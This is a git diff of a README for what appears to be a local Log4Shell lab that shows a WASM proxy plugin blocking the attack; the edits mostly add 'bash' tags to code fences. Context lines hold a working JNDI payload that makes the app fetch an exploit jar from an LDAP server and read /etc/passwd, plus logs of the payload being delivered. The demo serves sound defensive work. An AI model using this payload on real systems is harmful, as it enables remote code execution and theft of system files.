@@ -38,7 +38,7 @@ and the WASM plugin.
 
 You can start the applications locally with:
 
-```
+```bash
 make -C wasm-patch clean compile  # docker-compose needs the WASM binary to have been compiled
 docker-compose build
 docker-compose up
@@ -54,7 +54,7 @@ The contents of the "sub" claim in the provided token will trigger the attack ve
 
 **Executing the requests directly against the vulnerable app**
 
-```
+```bash
 $ curl http://localhost:8080
 Welcome, anonymous!
 Accessing: /
@@ -63,7 +63,9 @@ $ curl http://localhost:8080 -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciO
 Welcome, ${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}!
 Accessing: /
 ```
+
 We can see that the exploit was triggered by inspecting the vulnerable app logs:
+
 ```
 log4shell_1   | received request from 192.168.160.3:37650
 log4shell_1   | delivering malicious LDAP payload: {cn=pwned, exec/Y2F0IC9ldGMvcGFzc3dkCg== [{cn [pwned]} {javaClassName [io.tetrate.log4shell.exploit.Log4shellExploit]} {javaCodeBase [http://log4shell:3000/log4shell-exploit-1.0-SNAPSHOT.jar]} {objectclass [javaNamingReference]} {javaFactory [io.tetrate.log4shell.exploit.Log4shellExploit]}]}
@@ -102,7 +104,7 @@ vulnerable_1  | 13:40:09.410 [qtp1316061703-12] INFO  io.tetrate.log4shell.vulne
 
 When running the requests through the proxy we can see the access being denied as the traffic is filtered by the WASM plugin.
 
-```
+```bash
 $ curl http://localhost:8000
 Welcome, anonymous!
 Accessing: /
